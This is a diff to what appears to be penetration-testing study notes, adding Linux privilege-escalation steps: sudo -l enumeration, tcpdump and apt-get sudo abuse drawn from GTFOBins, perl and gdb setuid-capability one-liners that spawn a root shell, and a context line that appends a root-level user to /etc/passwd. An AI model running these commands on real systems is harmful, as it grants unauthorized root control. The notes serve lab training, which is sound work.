@@ -1423,6 +1423,24 @@ Reference
       ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
       ```
   - abuse sudo
+    - inspect current user sudo permission > (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
+      `sudo -l` 
+    - [abuse tcpdump sudo permission](https://gtfobins.github.io/gtfobins/tcpdump/#sudo) > permission denied  
+      ```
+      COMMAND='id'
+      TF=$(mktemp)
+      echo "$COMMAND" > $TF
+      chmod +x $TF
+      sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+      ```
+    - inspect syslog file for 'tcpdump' related events > audit: type=1400 audit(1661759534.607:27): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump"
+      `cat /var/log/syslog | grep tcpdump`
+    - verify AppArmor status >  /usr/sbin/tcpdump
+      `su - root` `aa-status`
+    - ['Apt-get'](https://gtfobins.github.io/gtfobins/apt-get/#sudo) privilege escalation payload
+      `sudo apt-get changelog apt`
+    - dd
+      
   - exploit kernel vulnerababilities 
 
 ### 19. Port redirection and SSH tunneling
@@ -2502,7 +2520,17 @@ Reference
     echo "root2:N5OdbV0I42eXc:0:0:root:/root:/bin/bash" >> /etc/passwd
     su root2
     ```
-- ddd
+- 18.4.1 Abusing setuid binaries and capabilities
+  https://gtfobins.github.io/gtfobins/gdb/
+  `/usr/sbin/getcap -r / 2>/dev/null`  
+  - Q1 Search for misconfigured capabilities "perl"
+    output: /usr/bin/perl = cap_setuid+ep  
+    `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`
+  - Q2 Search for misconfigured capabilities "gdb"
+    output: /usr/bin/gdb = cap_setuid+ep  
+    `gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit`
+- 18.4.2 Abusing sudo
+  - 
 
 ## Penetration testing report 
 - note editor:
